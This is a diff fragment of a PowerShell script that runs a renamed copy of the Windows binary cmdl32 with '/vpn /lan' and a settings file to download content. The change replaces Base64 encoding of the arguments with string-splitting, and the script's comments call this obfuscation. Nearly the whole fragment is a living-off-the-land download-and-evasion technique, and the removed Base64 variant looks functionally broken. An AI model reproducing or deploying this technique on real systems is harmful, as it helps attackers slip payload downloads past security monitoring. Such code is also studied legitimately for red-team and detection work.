@@ -42,23 +42,14 @@ if (Test-Path -Path $settingsFilePath) {
     Exit
 }
 
-# Define the full arguments string
-$rawArguments = "/vpn /lan `"$settingsFilePath`""
+# Obfuscating the arguments manually by splitting and reassembling
+$obfuscatedArguments = "/v" + "p" + "n /l" + "a" + "n `"$settingsFilePath`""
 
-# Convert the arguments string to Base64
-$encodedArguments = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($rawArguments))
-
-# Use PowerShell to decode and execute the Base64-encoded command at runtime
-$decodeCommand = "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encodedArguments'))"
-
-# Construct the final execution command
-$arguments = "-Command $decodeCommand"
-
-# Start the process
-Write-Host "[*] Performing download with Base64-obfuscated arguments"
+# Now, we will execute the command using the obfuscated arguments
+Write-Host "[*] Performing download with obfuscated arguments"
 try {
-    Start-Process -FilePath $renamedCmdl32 -ArgumentList $arguments -NoNewWindow -Wait
-    Write-Host "[*] Download complete using Base64-obfuscated arguments."
+    Start-Process -FilePath $renamedCmdl32 -ArgumentList $obfuscatedArguments -NoNewWindow -Wait
+    Write-Host "[*] Download complete using obfuscated arguments."
 } catch {
     Write-Host "[!] Download failed: $($_.Exception.Message)"
     # Revert permissions before exiting
